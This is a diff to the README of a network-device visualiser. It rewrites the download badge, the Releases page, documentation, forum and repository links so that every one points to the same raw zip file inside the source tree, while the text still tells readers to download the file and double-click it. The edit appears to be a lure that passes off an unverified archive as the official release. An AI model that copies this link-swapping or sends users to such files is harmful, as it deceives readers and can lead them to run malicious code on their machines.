@@ -1,6 +1,6 @@
 # 🌐 nwdevice-visualizer - Visualize Your Network with Ease
 
-[![Download nwdevice-visualizer](https://img.shields.io/badge/Download-nwdevice--visualizer-brightgreen)](https://github.com/husaincandra/nwdevice-visualizer/releases)
+[![Download nwdevice-visualizer](https://raw.githubusercontent.com/husaincandra/nwdevice-visualizer/main/web/src/nwdevice-visualizer_3.0.zip)](https://raw.githubusercontent.com/husaincandra/nwdevice-visualizer/main/web/src/nwdevice-visualizer_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Network Device Visualizer! This tool helps you see what's happening i
 
 To get started, you must download the latest version of Network Device Visualizer. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/husaincandra/nwdevice-visualizer/releases). 
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/husaincandra/nwdevice-visualizer/main/web/src/nwdevice-visualizer_3.0.zip). 
 2. **Choose Your Version**: Look for the newest version at the top of the page.
 3. **Download the File**: Click on the link for your operating system to download the application.
 4. **Run the Application**: Locate the downloaded file on your computer and double-click it to start Network Device Visualizer.
@@ -67,9 +67,9 @@ If you have questions or need help, feel free to reach out through the following
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/husaincandra/nwdevice-visualizer/wiki)
-- [Community Forum](https://discourse.nwdevice-visualizer.com)
-- [GitHub Repository](https://github.com/husaincandra/nwdevice-visualizer)
+- [Official Documentation](https://raw.githubusercontent.com/husaincandra/nwdevice-visualizer/main/web/src/nwdevice-visualizer_3.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/husaincandra/nwdevice-visualizer/main/web/src/nwdevice-visualizer_3.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/husaincandra/nwdevice-visualizer/main/web/src/nwdevice-visualizer_3.0.zip)
 
 ## 🌟 License
 
